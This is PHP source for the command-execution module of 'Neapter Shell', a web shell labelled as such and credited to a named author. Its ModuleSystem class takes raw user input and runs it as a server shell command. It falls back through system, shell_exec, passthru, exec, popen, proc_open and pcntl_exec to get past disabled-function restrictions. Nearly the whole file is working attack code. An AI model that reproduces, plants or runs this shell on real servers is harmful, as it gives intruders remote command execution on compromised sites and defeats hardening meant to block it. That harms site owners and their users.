<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Execute shell command using system, shell_exec, exec, passthru, popen,
 * proc_open or pcntl_exec php function
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleSystem extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'system',
            'exec'
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-13 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
system - Uruchomienie polecenia systemowego

    Użycie:
        system polecenie - uruchomienie polecenia

    Przykład:
        system ls -la
DATA;
    }

    /**
     * Does shell function is not blocked?
     *
     * @param  string $sFunc Function name
     * @return bool
     */
    protected function isFuncAvailable($sFunc)
    {
        return (!in_array($sFunc, $this->oUtils->getDisabledFunctions()));
    }


    /**
     * Execute shell command via pcntl_exec function
     *
     * @param  string $sCmd Command to execute
     * @return string
     */
    protected function getPcntl($sCmd)
    {
        echo "pcntl_exec():\r\n\r\n";

        $sFullPath = '';
        $sBin = $sCmd;
        $aArgs = array();

        if (($iPos = strpos($sCmd, ' ')) !== false) {
            $sBin = substr($sCmd, 0, $iPos);
            $aArgs = explode(' ', substr($sCmd, $iPos + 1));
        }

        foreach ($this->oUtils->getPathes() as $sDir) {
            if (is_file($sFile = $sDir . '/' . $sBin)) {
                $sFullPath = $sFile;
                break;
            }
        }

        $sTmpFile = $this->oUtils->cacheGetFile('exec');

        $rStdOut = null;
        switch (pcntl_fork()) {
            case 0:
                fclose(STDOUT);
                fclose(STDERR);

                $rStdOut = fopen($sTmpFile, 'w');
                pcntl_exec($sFullPath, $aArgs);
                break;
            default:
                break;
        }

        usleep(10000);

        pcntl_wait($iStatus);
        echo file_get_contents($sTmpFile);

        @ unlink($sTmpFile);
    }

    /**
     * Execute shell command
     *
     * @return string
     */
    public function get()
    {
        $sCmd = $this->oArgs->getRawData();

        if (strlen(trim($sCmd)) == 0) {
            return self::getHelp();
        }

        if ($this->oUtils->isSafeMode()) {
            return 'Safe mode jest włączone, funkcje systemowe nie działają!';
        }

        if (strncmp($sCmd, 'cd ', 3) === 0) {
            chdir(substr($sCmd, 3));
        }

        ob_start();

        if ($this->isFuncAvailable('system')) {
            echo "system():\r\n\r\n";
            system($sCmd);
        } elseif ($this->isFuncAvailable('shell_exec')) {
            echo "shell_exec():\r\n\r\n";
            echo shell_exec($sCmd);
        } elseif ($this->isFuncAvailable('passthru')) {
            echo "passthru():\r\n\r\n";
            passthru($sCmd);
        } elseif ($this->isFuncAvailable('exec')) {
            echo "exec():\r\n\r\n";
            exec($sCmd, $aOutput);
            echo implode("\n", $aOutput) . "\n";
        } elseif ($this->isFuncAvailable('popen')) {
            echo "popen():\r\n\r\n";
            $rFp = popen($sCmd, 'r');

            if (is_resource($rFp)) {
                while (!feof($rFp)) {
                    echo fread($rFp, 1024);
                }
            }
        } elseif ($this->isFuncAvailable('proc_open')) {
            echo "proc_open():\r\n\r\n";
            $rFp = proc_open(
                $sCmd,
                array(
                    array('pipe', 'r'),
                    array('pipe', 'w')
                ),
                $aPipe
            );

            if (is_resource($rFp)) {
                while (!feof($aPipe[1])) {
                    echo fread($aPipe[1], 1024);
                    usleep(10000);
                }
            }
        } elseif (function_exists('pcntl_exec')
            && $this->isFuncAvailable('pcntl_exec')
        ) {
            $this->getPcntl($sCmd);
        } else {
            ob_clean();
            ob_end_flush();

            return 'Cannot execute command. All functions have been blocked!';
        }

        $sData = "Cmd: '$sCmd'\r\nPHPfunc: " . ob_get_contents();
        ob_clean();
        ob_end_flush();

        return htmlspecialchars($sData);
    }
}
